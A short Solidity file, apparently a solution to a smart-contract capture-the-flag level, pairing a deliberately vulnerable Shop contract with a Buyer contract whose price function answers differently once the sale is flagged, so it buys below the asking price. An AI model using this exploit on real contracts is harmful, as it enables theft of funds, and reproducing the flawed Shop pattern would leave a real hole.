pragma solidity ^0.8.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Buyer {

    Shop target = Shop(0x371F8e98D787DFAe1cA9862930f6E166eaF7a7b6);

    function price() external view returns (uint) {
        return target.isSold() ? 1 : 101;
    }

    function robTheShop() external {
        target.buy();
    }
}